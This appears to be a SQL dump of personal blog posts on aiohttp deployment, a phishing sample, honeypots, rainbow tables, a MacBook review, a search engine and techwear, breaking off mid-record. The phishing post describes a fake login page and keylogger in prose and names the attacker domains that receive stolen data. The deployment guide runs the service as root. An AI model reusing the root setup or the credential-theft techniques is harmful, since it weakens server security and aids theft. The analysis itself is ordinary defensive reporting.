	(6,'aiohttp_deployment_guide','A Basic Deployment Guide For Aiohttp + Gunicorn + Nginx','2018-07-04','development','<p>In this guide we will be setting up a basic aiohttp app using Gunicorn and Nginx because the documentation on this I feel is very poor, as it took me a good few hours to figure out. Or maybe it was because I haven\'t used any of these technologies before... Either way, I didn\'t understand the documentation so I\'m writing my own.</p>\r\n<p>This guide assumes you are using Python3 and a Linux operating system with Systemd as the init system (e.g Ubuntu, CentOS, ...).</p>\r\n\r\n<h4>Table of Contents</h4>\r\n<ul>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x100\">Python Venv</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x200\">Aiohttp</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x300\">Systemd Unit</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x400\"\">Nginx Conf</a></li>\r\n</ul>\r\n\r\n<h3 id=\"x100\">0x100: Python Venv</h3><hr>\r\n<p>The first thing everyone should always do everywhere no matter where they are, or who they with, or where they come from, or where they are going, is set up a virtual environment for Python. If you\'re app doesn\'t use a virtual environment, you\'re an idiot and you should create one <i><strong>RIGHT NOW.</strong></i> Here\'s how:</p>\r\n<p>Use the python module <code>venv</code> to create a virtual environment called <code>env</code> (or anything else you prefer).</p>\r\n<pre>[user@okcomputer]$ python -m venv env</pre>\r\n<p>And that\'s how you create a Python virtual environment. Now we want to install the <code>aiohttp</code> and <code>gunicorn</code> modules.</p>\r\n<p>Source the environment:</p>\r\n<pre>[user@okcomputer]$ source env/bin/activate</pre>\r\n<p>Install the modules:</p>\r\n<pre>(env) [user@okcomputer]$ pip install aiohttp gunicorn</pre>\r\n<p>That\'s all we need to get started for now. You can install any other libraries you want into the environment with pip.</p>\r\n\r\n<h3 id=\"x200\">0x200: Aiohttp and Gunicorn</h3><hr>\r\n<p>With our new Python environment we are ready to create an aiohttp app! If you don\'t know, aiohttp is an asynchronous HTTP server/client. It\'s very useful when you\'re creating a web crawler that uses asyncio, but when you attempt to call it through a normal web framework, it doesn\'t work because as it turns out every good framework in existence is a blocking program so nothing works. So then you look for a framework that supports asycnio, then you find aiohttp and you\'re like <i>\'yeah this seems easy to use\'</i>. But <strong>NOPE</strong>, it turns out the documentation sucks, and the documentation that is there is for a completely different technology stack so you have no idea what to do because you only know Apache and neither aiohttp nor Gunicorn have documentation for it. So then your like <i>\'<strong>FUCK IT. </strong> I\'ll just buy another web sever, learn Nginx and put my crawler there\'.</i> So when you\'ve finished setting it up and it works all nice and good, you\'ve realised that it took way longer than it should have and so you write a blog post to rant about it because you don\'t like feeling as though it was wasted time.</p>\r\n\r\n<p>For this guide are writing a simple aiohttp application which we will call <code>myapp.py</code>.<p>\r\n<pre>\r\nfrom aiohttp import web\r\n\r\nasync def index(request):\r\n    return web.Response(text=\"I work!\")\r\n\r\nasync def factory():\r\n    app = web.Application()\r\n    app.router.add_get(\'/\', index)\r\n    return app\r\n</pre>\r\n\r\n<p>This is all we need to create a page that displays <code>I work!</code>. <code>factory</code> is our coroutine that returns the application instance for Gunicorn to use.</p>\r\n<p>Now we should test if Gunicorn is able to serve the project. We do this by name of the entry point (module) i.e. <code>myapp</code>, and the name of the app or application factory, i.e. <code>factory</code>, along with other Gunicorn settings provided as command line flags or in your config file. We will also use a custom worker subclass that aiohttp provides. The end result should look like this:</p>\r\n<pre>(env) [user@okcomputer]$ gunicorn myapp:factory --bind 0.0.0.0:8080 --worker-class aiohttp.GunicornWebWorker</pre>\r\n<p>Here we\'ve also bound it to <code>0.0.0.0:8080</code>, so now you can visit your sever\'s IP address in the browser appended with 8080 and you should see <code>I work!</code>.</p>\r\n<p>When you have confirmed that it works, you can close Gunicorn and deactivate the virtual environment.</p>\r\n\r\n<h3 id=\"x300\">0x300: Systemd Unit</h3><hr>\r\n<p>The next thing to do is create a Systemd unit file so that when our server starts it automatically runs Gunicorn and serves our app. Create a unit file in <code>/etc/systemd/service/myapp.service</code>, where you can replace <code>myapp</code> with whatever your project is called.</p>\r\n<pre>\r\n[Unit]\r\nDescription=Gunicorn instance to serve myapp\r\nAfter=network.target\r\n\r\n[Service]\r\nUser=root\r\nGroup=www-data\r\nWorkingDirectory=/var/www/myappdirectory\r\nEnvironment=\"PATH=/var/www/myappdirectory/env/bin\"\r\nExecStart=/var/www/myappdirectory/env/bin/gunicorn myapp:factory --bind unix:myapp.sock --worker-class aiohttp.GunicornWebWorker \r\n\r\n[Install]\r\nWantedBy=multi-user.target\r\n</pre>\r\n\r\n<p>In the <code>[Service]</code> we map out the working directory and set the <code>PATH</code> environmental variable so that the init system knows where our the executables for the process are located (within our virtual environment). We\'ll then specify the commanded to start the service. Systemd requires that we give the full path to the Gunicorn executable, which is installed within our virtual environment.</p>\r\n\r\n<p>Now we can start and enable the service:</p>\r\n<pre>\r\n[user@okcomputer]$ sudo systemctl start myapp.service\r\n[user@okcomputer]$ sudo systemctl enable myapp.service\r\n</pre>\r\n\r\n<h3 id=\"x400\">0x400: Nginx Conf</h3><hr>\r\n<p>If you\'ve noticed, in the Systemd unit, we\'ve bound Gunicorn to <code>unix:myapp.sock</code>. Now Gunicorn should be waiting for requests to the socket file <code>myapp.sock</code> in our project\'s directory. We need to configure Nginx to to pass requests into this socket. Here is an example of a server block you can use:</p>\r\n<pre>\r\nserver {\r\n    listen 80;\r\n    server_name myappdomain;\r\n\r\n    location / {\r\n        # checks for static file, if not found proxy to app\r\n        try_files $uri @proxy_to_app;\r\n    }\r\n\r\n    location @proxy_to_app {\r\n        include proxy_params;\r\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\r\n        proxy_set_header X-Forwarded-Proto $scheme;\r\n        proxy_set_header Host $http_host;\r\n        # we don\'t want nginx trying to do something clever with\r\n        # redirects, we set the Host: header above already.\r\n        proxy_redirect off;\r\n        proxy_pass http://unix:/var/www/myappdirectory/myapp.sock;\r\n    }\r\n}\r\n</pre>','aiohttp-deployment.png','aiohttp,gunicorn,nginx,python','no'),
	(7,'bad_malware_analysis','Let\'s Look At Malware I Got From Work','2018-07-06','infosec','<p>Today we\'re going to be looking a malware I received from a phishing attempt on my work email. Although I have zero skills in malware analysis, this piece of malware is very simple and uninteresting so this shouldn\'t take very long.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wmal-email.png\" alt=\"image-alternative\">\r\n<p>Here\'s the email I received (with sensitive information censored). It\'s a wetransfer download link to a HTML file, so it\'s already incredibly suspicious because who would send a HTML file? Anyway, let\'s pop this bad boy into a virtual machine.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wmal-html.png\" alt=\"image-alternative\">\r\n<sub>Fun fact: I forgot to create a snapshot before opening the file. Make sure to not do this.</sub>\r\n<p>As you can see, the file is just a fake Office 356 login page. Which confuses me even more because you can see from the address bar that you aren\'t logging into Office so why would you put your details in? It also looks more like a Google login page rather than Outlook which is more confusing! Although I have heard that at least two people from my office have tried to use it, so what would I know. Getting back on track, let\'s go and look at the source code, thankfully it is only HTML and I don\'t have to do any real reverse engineering as we can just look at the source code in plaintext.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wmal-signin.png\" alt=\"image-alternative\">\r\n<p>While most of the code is in minified JavaScript and I\'m not bothered to go and un-minify it, we\'re just going to be looking at the stuff we can see immediately. The image above shows the HTML for the sign-in we saw earlier. <code>validateForm()</code> is just a function to validate the email address, nothing interesting there. But we can see that it sends a POST request to <code>kombiservis.co</code>, which would obviously be our attacker\'s domain.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wmal-check.png\" alt=\"image-alternative\">\r\n<p>Going further down there\'s this interesting piece of code. I have no idea what it does, probably because it interacts with the minified code. Based on how it sets <code>iframeUri</code> to <code>https://accounts.youtube.com/accounts/CheckConnection</code>, I\'m going to go ahead and assume that it attempts to find if you\'re logged into YouTube and takes your credentials as the link is very similar to <code>https://accounts.youtube.com/accounts/SetSID</code> which is what Google uses to log you into YouTube when using other Google sites, such as Gmail.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wmal-keylogger.png\" alt=\"image-alternative\">\r\n<p>The last piece we\'re going to look at is this simple keylogger, which puts the keys enter in the tab into the variable <code>keys</code> and sends it as a GET request parameter every 10 seconds to <code>wq14u.com</code>, which is a different domain to the one we saw earlier.</p>\r\n<p>I\'ve also heard from around the office that it sets up auto delete and reply rules on your email, which is probably something that\'s done when you enter your credentials into the form and POST them to the server.</p>\r\n<p>All in all, a very simple piece of malware which I may come back to at some point to un-minify the JavaScript and see if does anything more interesting.</p>\r\n','malware-look-thumb.png','malware,html','no'),
	(8,'honeypot_basics','An Introduction to Honeypots/Honeynets','2018-07-09','infosec','<blockquote><p>Prevention Is Ideal, But Detection Is A Must</p><footer>Eric Cole’s Four Basic Security Principles (No. 4)</footer></blockquote>\r\n<p>A honeypot or a collection of honeypots (honeynet) is a controlled vulnerable system created to lure attackers. A honeypot appears to be a legitimate part of the site, but is actually isolated and monitored, and that seems to contain information or a resource of value to attackers. This allows honeypots to act a an early warning system, deceiving attackers, perhaps delaying and identifying them, and then ultimately supporting efforts to shut down the attack.</p>\r\n\r\n<p>In general, you would use a honeypot to understand what is happening in key systems. If a web server is receiving thousands or millions of hits per day, it can be hard to differentiate between legitimate connections and attackers. Honeypots allow you to have a way to analyse attack traffic as your honeypot should have no legitimate users, allowing you to quickly identify attack traffic and create counter-measures.</p>\r\n\r\n<p>There are 3 types of honeypots; low, medium and high interaction. Each type provides varying levels of security/detection difficulty, intelligence, and setup complexity. High interaction honeypots imitate the activities of the production systems that host a variety of services and, therefore, an attacker may be allowed a lot of services to waste their time. However, they use a lot of resources and can be complicated to setup. On the other hand, low interactions honeypots are easy to setup but provide the least amount of intelligence, as they only simulate the services frequently visited by attackers.</p>\r\n\r\n<p>As an example, we will be looking at <a href=\"https://www.anomali.com/platform/modern-honey-net\">Modern Honey Network (MHN)</a>, a honeypot management service by Anomali, which allows you to quickly deploy and manage honeypots. It utilises the HPfeeds protocol to centralise the data into a MongoDB instance for analysis.</p>\r\n\r\n<p>MHN consists of a management server and one or more honeypots. The management server is where the honeypots send their data to, and creates a Flask app to make the data easily viewable from a web interface. A big advantage of MHN is it\'s simplicity and variety of honeypot deployment options. Honeypot deploy scripts include several common honeypot technologies, including: </p>\r\n<ul>\r\n<li><strong>Snort:</strong>  An open source intrusion prevention system capable of real-time traffic analysis and packet logging. It is not a honeypot per se, but an IDS/IPS, and is  very helpful to detect attacks on your network. Sourcefire (the creator of Snort) was a acquired by Cisco but the product Snort remains open source.</li>\r\n<li><strong>Suricata:</strong> An IDS/IPS much like Snort.</li>\r\n<li><strong>Dionaea:</strong> A low interaction honeypot which exposes services like SMB, MSSQL, SIP, HTTP, FTP, TFTP. It is mainly used to trap malware exploiting vulnerabilities exposed by services offered to a network, and attempts to get a copy of it.</li>\r\n<li><strong>Glastopf:</strong> A very popular Python web application honeypot that has the ability to emulate thousands of web vulnerabilities. It is no longer actively developed but it is \"maintained\" according to the developers. </li>\r\n<li><strong>Cowrie:</strong> A medium interaction SSH and Telnet honeypot designed to log brute force attacks and the shell interaction performed by the attacker.  It has SFTP support, SCP support, direct-tcpip (proxying) support and many other features.</li>\r\n<li><strong>p0f:</strong> A tool that that uses passive fingerprinting to identify the OS behind a TCP connection.</li>\r\n<li><strong>Conpot:</strong> A low interaction Industrial Control Systems honeypot and basically emulates some protocols used in industrial environments.</li>\r\n<li><strong>Wordpot:</strong> A WordPress emulator honeypot which detects probes for plugins, themes, timthumb and other common files used to fingerprint a Wordpress installation.</li>\r\n<li><strong>ShockPot:</strong> A web app honeypot designed to find attackers attempting to exploit the Bash remote vulnerability CVE-2014-6271.</li>\r\n</ul>\r\n<p>From these, it should be easy to see the application of honeypots and their usefulness. However, as with any technology, there is no perfect solution. If compromised, a honeypot or honeynet can act as a springboard to launch additional system attacks to the \"real\" servers. In some cases, honeypots can decrease and organization\'s security by being more attractive to attacks and that the establishment of a vulnerable system can constitute as \"gross negligence\". In order for your honeypot to be effective, it must be monitored continually.</p>\r\n','honeypot-thumb.png','honeypot,honeynet','no'),
	(9,'rainbow_tables','I Learn To Draw Diagrams and You Learn About Rainbow Tables','2018-07-17','infosec','<p>As most people should know, a Rainbow Table is a way of mapping a plaintext to it\'s hash by storing the plaintext -> hash combo in a file on the hard drive. However, storing every hash individually takes up an amount of space nobody could ever have. There is much more going under the hood of a Rainbow Table, and today we are going to look at how it attempts to minimise the memory it takes up.</p>\r\n\r\n<p>Generating a Rainbow Table uses two key functions: a hash function and a reduction function. The hash function maps a plaintext to a hash.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/hash.png\" alt=\"image-alternative\" style=\"margin: auto;\">\r\n\r\n<p>While the reduction function maps a hash to a plaintext. The reduction function obviously does not generate the original plaintext of the hash, it is not an <i>inverse</i> hashing function because that should be impossible. What the reduction function does is create a new plaintext from the hash. The reduction function is a key part of the Rainbow Table and is very complicated. So for the purposes of this article, we will keep it simple. In our case we will have a reduction function that takes the first 7 characters of a hash.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/reduction.png\" alt=\"image-alternative\" style=\"margin: auto;\">\r\n\r\n<p>A rainbow table is made of up of chains of hashes and reductions. A chain starts with an arbitrary plaintext and ends with a hash. The plaintext will go through the process of being hashed and reduced millions of times. The table only stores the starting plaintext, and the final hash you choose to end with, and so a chain \"containing\" millions of hashes can be represented with only a single starting plaintext, and a single finishing hash.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/chain.png\" alt=\"image-alternative\" style=\"margin: auto;\">\r\n\r\n<p>Now that we have our table of chains. We can start looking for an unknown plaintext with a hash. Here is the process:</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/rainbow-process.png\" alt=\"image-alternative\" style=\"margin: auto;\">\r\n\r\n<p>In this way you check through the hashes in the chains, which aren\'t actually stored anywhere on disk, by iterating column by column through the table of chains, backwards from the last column in the chain, to the starting plaintext.</p>\r\n\r\n<p>The reason they\'re called Rainbow Tables is because each column uses a different reduction function. If each reduction function was a different color, and you have starting plaintexts at the top and final hashes at the bottom, it would look like a rainbow (a very vertically long and thin one).</p>\r\n','rainbow-thumb.png','rainbow','no'),
	(10,'macbook_impressions','MacBook & MacOS First Impressions','2018-07-25','miscellaneous','<p>A week ago I bought a new 2018 13\" MacBook Pro. As my first dive into the Apple ecosystem, I\'d say it went quite well (even if the thumbnail says otherwise). Here are my initial thoughts on it.</p>\r\n<h3>Hardware</h3><hr>\r\n<p>These are some of the things I care about when looking at computer hardware in no particular order.</p>\r\n<ul>\r\n	<li><strong>Keyboard:</strong> I actually like it more than normal membrane keyboards, especially laptop keyboards, mainly due to the short travel time. I would be using a mechanical keyboard instead so this wouldn\'t be an issue, except the next point makes it a lot harder.</li>\r\n	<li><strong>Output Ports:</strong> There are only 4 USB-C ports. That\'s it. It\'s cool that there is a headphone jack (that shouldn\'t deserve praise, but here we are), but 4 ports is not nearly enough for anyone, <i>ESPECIALLY</i> when the charger takes up one of them. I don\'t have any peripherals that even use USB-C, so I would have to buy dongles for all 4 ports, which is very stupid and a waste of money.</li>\r\n	<li><strong>The Touchbar.</strong> I kinda like it. I\'ve been using it a lot more than I expected to. Going between a tactile keyboard to a touchscreen can be jarring, and I always have to look at what I\'m trying to press, but I don\'t hate it. Except for the fact that it replaces the ESC key. <i>THIS</i> is the probably the thing I hate the most about the touchbar, even if it sounds stupid. The problem is that I use Vim for everything, which means I press ESC very often. I don\'t know where the ESC key is on the touchbar (because it\'s not tactile), so I always miss it. So now I\'ve had to map caps lock to ESC (which was very easy to do actually), but this messes up my muscle memory as caps lock would normally be mapped to backspace for me.</li>\r\n	<li><strong>The CPU & RAM:</strong> I got the base model MacBook (i5 + 8gb) which is actually fine for me. So far I haven\'t come across any issues with it being too slow, nothing I do is very hardware intensive as most of the code I write is more I/O intensive than computation intensive. It gets the job done, although $2500 AUD for and i5 and 8gb of RAM is quite expensive.</li>\r\n	<li><strong>The Chasis:</strong> It looks nice. Actually, it looks VERY nice. I have no complaints, it feels like a premium product. Although, I haven\'t had much experience with other modern laptops, I\'d say it\'s the best looking, and best feeling laptop on the market.</li>  \r\n</ul>\r\n\r\n<p>So far these impressions are pretty mixed. It certainly doesn\'t look like it\'s worth $2500, but that\'s all changed with the software (sort of).</p>\r\n\r\n<h3>Software</h3><hr>\r\n<p>I\'ve used switched between Windows and Linux as my daily OS for most of my life, although Linux has been sticking around for much longer during the past few years. I\'ve never touched MacOS for any more than five minutes before. So we are just going to look at whether we can do the same things on MacOS as we can on Windows and Linux.</p>\r\n\r\n<h4>Windows</h4>\r\n<p><strong>Can it play video games?</strong><br>No. Not the ones I want to play.<p>\r\n<p>Turns out that video games is all I use Windows for. Guess I\'m still going to have to keep a separate computer for it then.</p>\r\n\r\n<h4>Linux</h4>\r\n<p><strong>Can you rice it?</strong><br>Yes, I think. Haven\'t looked into it because it already looks pretty good.</p>\r\n<p><strong>Is the terminal powerful enough for me to be able to ignore everything else?</strong><br>No. Even though I use zsh just like on Linux, MacOS doesn\'t let you do everything. It is good enough to do most of what I want however (it\'s light years ahead of Windows).</p>\r\n<p><strong>Does it have a good package manager</strong><br>Not really. Homebrew is helpful, but is in no way a replacement for something like Pacman, let alone the AUR.</p>\r\n<p><strong>Does software constantly break because nobody supports Linux?</strong><br>No. MacOS also has Sequel Pro, which is probably the best MySQL viewer in existence.</p>\r\n<p><strong>Does Xorg break every time you update the computer?</strong><br>No.</p>\r\n<p><strong>Do you constantly have to go into conf files to fix things?</strong><br>No.</p>\r\n\r\n<p>Ok, it looks like this starting to become a rant on Arch Linux so I\'m just going to stop here. The point is that MacOS, with all it\'s shitty proprietary software restrictions, is incredibly easy to use. Even though most of my issues with Linux are mainly from using a distro like Arch, it\'s been a whole week I haven\'t had any problems with it. I haven\'t had to mess with any drivers or config files, everything just worked out of the box.</p>\r\n\r\n<p>A few years ago I probably would have hated this, because I preferred constantly breaking my computer and learning how to fix it. But now I have a job and actual things to do. I don\'t have time to spend a whole weekend reading man pages. Although I would say I have learnt enough where I could fix a problem that would have taken me a day to now only take a few minutes, I can\'t be bothered with it anymore.</p>\r\n\r\n<p>Right now I have three computers running on three operating systems. Windows at home for video games, Linux at work (even though I probably shouldn\'t), and now MacOS for personal use. Based on this short experience I can pretty safely say that Windows is the worst operating system ever created, and is holding video games as hostage. Hopefully I\'ll be able to ditch Windows very soon and never have to come back to that dumpster fire ever again.</p>','macbook-thumb.png','macos,macbook','no'),
	(11,'how_do_you_write_a_search_engine','How The Fuck Do You Write A Search Engine?','2018-07-30','development','<p>Following on with my previous article where we look at <a href=\"/article/how_do_you_write_a_blog\">old, shitty code and rebuild it</a>, today we are looking at code I made for a school assignment. It was a search engine called \'viperidae\' (I don\'t know how you are supposed to pronounce it) and was the first big software project I\'ve ever done. You could even say that it was a MAJOR project... because it was. It was for my SDD Year 12 major project. But before we begin, I\'ll just get the question that everyone has right now out of the way.</p>\r\n\r\n<p><strong>What mark did you get?</strong></p>\r\n<p>95/100. I lost some marks because the parts of the documentation were lacking and because it only had 2 screens (there was a requirement for 3 screens, which is a STUPID requirement).</p>\r\n\r\n<p>With that, we can now take a dive into the distant past of 2017.</p>\r\n<p>This was my first repository on GitHub so you can go and look at it <a href=\'https://github.com/apt-helion/viperidae-old\'>here</a>. Fun fact: if you look at the commit history (and ignore the terrible commit messages), you\'ll see that I actually started writing it a month (Dec 2016) before I was given the assignment (Jan 2017). I\'m pretty sure that this is not allowed as you can\'t hand in anything you\'ve created before the assignment is given, but as we all know: \'<i>it\'s only cheating if you\'re caught</i>\'.</p>\r\n\r\n<p>Setting it up is pretty straightforward. Create a virtual environment, pip install <code>requirements.txt</code>, and then run <code>run.py</code>. If you did that then type <code>127.0.0.1:5000</code> in your browser\'s url bar which should show you this:</p>\r\n\r\n<img class=\'img-responsive\' src=\'/common/static/img/viperidae-old-start.png\'>\r\n<p>There are four fields to fill out here: <code>search</code>, <code>depth</code>, <code>include external links</code>, and <code>seed</code>. Unfortunately I don\'t have my original documentation which explained all of this and more, so I\'ll quickly explain why there are so many fields and what they do.</p>\r\n\r\n<p>In case you don\'t know, writing a search engine is hard. Way too hard for any normal 17 year old, which caused me to cut a lot of corners. One of the biggest corners to cut was the entire \'index the entire web\' part of a search engine. Because I was too dumb to understand any forms of concurrency or parallelism, I decided that I would not index any parts of the web because my web crawler was <strong>WAYYYY</strong> to slow. So it was decided that the web crawler would be a more integral part of the engine where the site was crawled during the search, instead of a precursor to it. This meant that in order to conduct a search, you also had to type in the website. This is the <code>seed</code> field. In the documentation I managed to frame this as \'<i>creating more accurate searches by focusing on individual sites</i>\'. Not the best excuse, but hey, anything for marks.</p>\r\n\r\n<p>Now obviously I could have used something like Scrapy as a web crawler, which would have worked fifty billion times better than whatever I made. But I felt as though I was already using too many libraries and that I should write my own code. After all you wouldn\'t just <code>import Essay</code> would you?</p>\r\n\r\n<p>However, that corner apparently wasn\'t cut enough. My crawler was still much too slow to crawl even a small website in a reasonable time. This is band-aided by the <code>depth</code> field which basically just limits how many pages are searched, which means I just let the user decide how long they want to wait.</p>\r\n\r\n<p>The rest of the fields are just options for these round edges. <code>search</code> is obviously the item you want to search for and <code>include external links</code> determines if the crawler will crawl through links that aren\'t part of the seed website.</p>\r\n\r\n<p>To be honest, that explanation covers pretty much everything I dislike about it. I\'ve not really talked about the actual searching, but I don\'t expect myself to be able to create a super advanced algorithm to find exactly what you want. I just created something that worked well enough, as in it pointed you to a small house and said \"ehhh it\'s somewhere in \'ere mate\", ignoring the fact that you just asked for where it was in the small house.</p>\r\n\r\n<p>Now is finally the time to look at the new search engine!</p>\r\n\r\n<p>One of the big reasons I didn\'t like old viperidae was because it had no reason to exist as I had to hand wave a reason in the documentation. So now I\'ve given the new on a real reason. It\'s a developer focused API for searching individual websites. It\'s a way for users to quickly create searching for their website with loads of special features. Although right now I haven\'t built any of the developer focused parts, I\'ve built a redesign of the original engine. You can see a restricted, public demo <a href=\"https://viperidae.app\">here</a>. If it were using the developer API, the website would already be indexed so the engine wouldn\'t have to crawl it. The API source is <a href=\"https://github.com/apt-helion/viperidae\">here</a> and the source for the public website is <a href=\"https://github.com/apt-helion/viperidae-site\">here</a>.</p>\r\n\r\n<p>This is all pretty bare bones right now because I\'ve spent most of my time learning some new stuff while redesigning the engine. Namely the fact that the crawler is now asynchronous and is much faster than the original. Although it\'s still not Scrapy fast, it shouldn\'t really matter because the websites should be indexed anyway.</p> \r\n\r\n<p>There is still a lot to do (pretty much all of it). But I\'m sure in another year\'s time, I\'ll look back at it and decide that it\'s garbage and remake it all again.</p>','viperidae-thumb.png','viperidae,python','no'),
	(13,'techwear_clothing','Techwear Clothing and How To Live Out Your Dystopian Cyberpunk Dreams','2018-08-27','miscellaneous ','<p>If you\'re anything like me, then one of your favorite things is seeing how much tech people can shove into absolutely anything because this leads us to two things: more IoT devices which act as a source of comedy where you laugh at their terrible security practices, and a closer look at our dystopian future where we will buy wiretaps to buy cat food on Amazon (oh wait, we already do that). Thankfully you can\'t hack clothes as nobody has put the internet inside of them (not giving you any ideas), and all the tech in Techwear is mainly based upon advanced materials and functionality, that is technicality instead of technology. This article should serve as an introduction to the only fashion style where a >$1000 price tag is actually justifiable.</p>\r\n\r\n<h4>Table of Contents</h4>\r\n<ul>\r\n    <li><a href=\"#0x100\">Construction</a></li>\r\n    <li><a href=\"#0x200\">Clothes</a></li>\r\n    <li><a href=\"#0x300\">Styles/Brands</a></li>\r\n</ul>\r\n\r\n<h3 id=\"0x100\">0x100: Construction</h3><hr>\r\n<p>The most important part of Techwear is obviously: the tech. This section will go through the main parts of what makes Techwear so... techy. While there are many innovations currently being made such as Volleback\'s jacket made out of <i>HECKING GRAPHENE</i> (no seriously look it up, it\'s amazing), we will mainly be focusing on the more common parts of Techware you will see - waterproof breathable fabrics.</p>\r\n<h4>Layers</h4>\r\n<p>Waterproof breathable fabrics are tasked to: repel and hold its own against moisture, downpour, and allow water vapour and moisture from within to escape, keeping you dry. This is made possible by shells layers which are three in total, but separated into two main parts.</p>\r\n\r\n<p>All layers are composed of the outer layer also known as the face fabric, responsible for being presentable and functional from which it inherent from fabric such as polyester, nylon, cotton-twill, etc. With a durable water repellent (DWR) treated to the outer layer to prevent saturation by water. Creating a high surface tension causing water to “bead”, running off preventing clothes from being damp from long periods of downpour.</p>\r\n\r\n<p>The inner layer is composed of two parts, the second layer comprises of a laminated membrane or a coating, and the third layer known as the liner. The membrane is tasked to be breathable and waterproof, through its pores that allow water vapor molecules to escape, but small enough to not let liquids from entering. Coating, made from polyurethane, is capable of being lighter than laminate and significantly cheaper to apply. But falls sort in its breathability, however new methods of application such as microporous coatings and monolithic coatings helps improve in this nature. Simply and lastly, the liner a mesh used for protecting the membrane. </p>\r\n\r\n<h4>Waterproof</h4>\r\n<p>Waterproof fabrics resist liquid from passing through. There is no standard for testing waterproofness in fabrics. One method of testing is known as the static column test. Measured in millimeters, is determined by the amount of water it can hold by placing a tube with a 1x1 (inches) dimension over fabric, so if a jacket had the rating of 5,000 mm the tube will be able to hold water up to that height before it begins leak.</p>\r\n\r\n<h4>Breathability</h4>\r\n<p>Breathability or moisture vapor transmission rate is measured by the rate at which water vapour passes through, in grams of water vapour per square meter of fabric per 24-hour period (g/m2/d), often abbreviated to just \"g\". Methods for measuring breathability by fabrics also differs from manufacturers and results vary in tests and real world conditions thanks to temperature, humidity and pressure. A method of testing is similar to water, but with vapor and how much it can past through in a square meter from within to outside within 24 hours. So a rating of 5,000 would allow 5,000 grams of water vapor to pass through a period of 24 hours. </p>\r\n\r\n<h3 id=\"0x200\">0x200: Clothes</h3><hr>\r\n<p>In this section we will go through common pieces of Techwear clothing and look at their purpose. Most Techwear brands favour a form of layered clothing as it it allows them to offer \"technical\" or \"functional\" clothes which are optimized for the particular demands of a specific layer.</p>\r\n\r\n<h4>Shell Layer</h4>\r\n<p>The outermost clothes are called the shell layer. This generally just refers to a jacket, but the term shell is used by companies that specialize in technical clothing as it implies a greater layer of protection from the outside. Such features a shell would come with is water resistant, wind proof, heat retention and more. Shells go into two categories, the hardshell and the softshell.</p>\r\n\r\n<p>The hard-shell is the primary layer, often the most expensive piece to the arsenal. The hardshell provides the most function and durability out of an entire fit, allowing other layers mainly for added insulation to go beneath it. When looking to purchase a hardshell, look for an explicit description of the production functionality, although a hardshell will always home waterproof and breathable functionality this is a general rule that goes into all functional pieces you plan on buying.</p>\r\n\r\n<p>The softshell, given by its name isn’t as durable as the hard shell, however it does share many qualities. The common tradeoff between the softshell and a hard-shell is ease of use and mobility. Softshells often try to combine partial or full water resistance with partial or full wind breaking ability. In many cases insulation is also combined in an attempt to replace several layers with a single highly flexible one.</p>\r\n\r\n<p>If heavy sweating is expected, you should avoid wearing any shell layer garments unless their protective properties are essential. For example, if you\'re jogging, no traditional shell layer is likely to be able to transfer enough moisture to keep you feeling dry, however a shell would be essential for hiking in the snow.</p>\r\n\r\n<h4>Mid Layer</h4>\r\n<p>The mid layer is needed in cold weather to provide additional insulation. The use of multiple thin layers facilitates adjustment of warmth. Fleece is a popular choice for this layer as it serves to be a great material for body regulation, providing the much needed breathability and moisture wicking needed in order to stay comfortable when layering this under ones hardshell. An alternative to fleece is down, which a fine layer of feathers with its natural ability to trap air makes them affordable insulators, and padding that some might come to love. When shopping in for this layer look for hoodies, vests, sweaters, and jackets. </p>\r\n\r\n<h4>Inner/Base Layer</h4>\r\n<p>Given by its name, the base layer is the absolute bottom layer in any fit. The purpose of the inner layer is to draw the sweat away from the skin to the next layers. This would include the average: socks, underwear, undershirts, and shirts. In the functional clothing industry, they often carry attributes that levitate around making the wearer more comfortable, such things like this include: breathability, anti-bacterial, deodorizing, heat retention, stretchable etc. </p>\r\n<p>Merino is the common material in this field, merino wool is wicking and a natural temperature regulator, very durable and long lasting, however buying clothes made of merino could be very expensive. Other brands, such as Uniqlo might use a blend of materials to produce layers that aid in function. Companies that practice such things tend to be much cheaper and don\'t provide the many functions gained by wearing a layer of merino. </p>\r\n\r\n<h3 id=\"0x300\">0x300: Styles/Brands</h3><hr>\r\n<p>This is everyone\'s favourite part. We will now look at what brands provide Techwear clothes and what style they will fit into. With this guide all you will need to do next is mortgage your house, sell your right kidney, and sacrifice your first born and you will be ready to feed the capitalist machine, further accelerating our descent into a dystopian society. But you\'ll look cool doing it, so it\'s all worth. And just because I\'m so nice, I\'ll even give you an idea of how many kidneys you\'ll have to sell in order to afford each style, although keep in mind that this is a very general idea from my own experience of kidney selling, and that you may find that a 1 kidney style can have items that would need 12 kidneys.</p> \r\n\r\n<h4>Outdoors</h4>\r\n<p>Heavily centered on protecting you from your environment wherever you may be: hiking, camping, snow sports, etc. Outdoors are made reliable, functional, inexpensive because of its abundance, and made stylish for us wear while in our less extreme urban environments. Look towards brand names like Arc’teryx, REI, Patagonia, The North Face, and Columbia for getting outdoor gear.</p>\r\n<p><b>General Price: </b>3 Kidneys</p>\r\n\r\n<h4>Athletic</h4>\r\n<p>Primarily made for sporting gear, athletic clothing is a easy way to obtain base layers, shells, footwear, made with simple functionality when shopping for the basic brands such as Adidas and Nike. Although kind of iffy in the community whether wearing all athletic gear should even be considered Techwear look at more designer gear like Adidas and Yohji Yamamoto\'s Y-3, and divisions of Nike that produce more technical clothing like Nike Gyakusou and ACG.</p>\r\n<p><b>General Price: </b>2 Kidneys</p>\r\n\r\n<h4>Military</h4>\r\n<p>Sporting the latest of fabric technology, brands that serve military contracts have the benefit to use their field tested innovations and integrate them into Techwear. Brands such as Arc\'Teryx Leaf and Triple Aught Design have the edge to keep new technologies on the market in a distinct military style.</p>\r\n<p><b>General Price: </b>3 